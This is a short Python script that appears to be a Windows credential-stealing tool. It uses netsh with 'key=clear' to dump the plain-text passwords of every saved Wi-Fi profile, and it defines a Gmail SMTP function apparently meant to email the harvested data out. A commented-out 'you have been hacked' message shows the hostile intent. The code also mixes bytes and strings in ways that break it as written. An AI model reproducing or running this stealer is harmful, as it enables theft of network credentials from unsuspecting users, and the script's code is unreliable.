import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    # server.starttls()
    server.set_debuglevel(True)
    server.login(email, password)
    server.auth_plain()
    server.sendmail(email, email, message)
    server.quit()


# Send message
# command = r'%SystemRoot%\Sysnative\msg.exe * you have been hacked'
# command = 'ipconfig'
command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ''
for network_names in network_names_list:
    command = f'netsh wlan show profile {network_names} key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result


